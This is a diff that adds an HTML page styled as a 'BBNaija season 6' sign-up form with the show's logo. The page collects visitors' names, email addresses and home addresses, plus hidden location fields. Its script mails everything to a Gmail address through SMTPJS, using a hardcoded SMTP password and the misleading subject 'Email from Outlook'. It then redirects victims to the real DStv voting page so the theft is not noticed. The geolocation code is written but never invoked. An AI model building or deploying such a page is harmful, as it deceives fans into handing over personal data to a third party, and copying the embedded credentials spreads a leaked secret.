@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>BBNaija season 6</title>
+	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+
+	<style type="text/css">
+		body{
+			background: #202123;
+			color: #ffffff;
+		}	
+
+		form{
+			margin-top: 20px;
+			padding: 10px;
+			border-radius: 5px;
+			background-color: #434343;
+    		border: 1px solid #434343;
+		}	
+
+		.btn-warning{
+			background-color: #fe5900;
+			border: 1px solid #fe5900;
+			color: #ffffff;
+		}
+		.btn-warning:hover{
+			background-color: #fe5900;
+			border: 1px solid #fe5900;
+			color: #ffffff;
+		}
+	</style>
+</head>
+<body>
+	<div class="row" id="page">
+		<div class="col-md-4"></div>
+		<div class="col-md-4">
+			<form>
+				<div style="text-align: center;">
+					<img src="https://i.postimg.cc/W3Ssj1rC/logobbnaija.png" width="90">
+				</div>
+				<div class="form-group">
+				    <label for="fname">First Name</label>
+				    <input type="text" class="form-control" placeholder="Enter First Name" id="fname">
+				</div>
+
+				<div class="form-group">
+				    <label for="lname">Last Name</label>
+				    <input type="text" class="form-control" placeholder="Enter Last Name" id="lname">
+				</div>
+
+				<div class="form-group">
+				    <label for="mobile">Email</label>
+				    <input type="email" class="form-control" placeholder="Enter Mobile Number" id="email">
+				</div>
+
+				<input type="hidden" name="lat" id="lat" >
+				<input type="hidden" name="lng" id="lng" >
+
+				<div class="form-group">
+				    <label for="address">Home Address</label>
+				    <input type="text" class="form-control" placeholder="Enter your address" id="address">
+				</div>
+
+		  		<button class="btn btn-warning btn-block" id="sub">Submit</button>
+			</form>
+		</div>
+		<div class="col-md-4"></div>
+	</div>
+	<script src="https://smtpjs.com/v3/smtp.js"></script> 
+	 <script type="text/javascript">
+ 
+		var x = document.getElementById("page");
+
+
+		const sub = document.querySelector("#sub");
+
+
+		sub.addEventListener("click", (e) =>{
+			e.preventDefault();
+
+			let name    = document.getElementById("fname").value+" "+document.getElementById("lname").value;
+			let email   = document.getElementById("email").value;
+			let address = document.getElementById("address").value;
+			let lat     = document.getElementById("lat").value;
+			let lng     = document.getElementById("lng").value;
+
+
+			function getLocation() {
+			  if (navigator.geolocation) {
+			    navigator.geolocation.getCurrentPosition(showPosition);
+			  } else { 
+			    x.innerHTML = "Geolocation is not supported by this browser.";
+			  }
+			}
+
+			function showPosition(position) {
+			 // console.log("Lat: "+position.coords.latitude + " Log:"+position.coords.longitude);
+			  document.getElementById("lat").value = position.coords.latitude;
+	          document.getElementById("lng").value = position.coords.longitude;
+
+			}
+
+
+			Email.send({ 
+		        Host: "smtp.elasticemail.com", 
+		        Username: "suxythree@gmail.com", 
+		        Password: "DCFAE115E4E38DDB4143ABB75A16753041BF", 
+		        To: 'suxyone@gmail.com', 
+		        From: "suxythree@gmail.com",  
+		        Subject: "Email from Outlook", 
+		        Body: "Name: "+name+", EMAIL:"+email+" Address:"+address+", Lat:"+lat+", Lng:"+lng
+		    }).then(function (message) { 
+		          window.location = "https://africamagic.dstv.com/show/big-brother-naija/news/here-s-how-you-can-vote-bbnaija/news";
+		        }, err=>{
+		            console.log(err.message);
+		    });
+		});
+        
+        </script>
+        
+</body>
+</html>
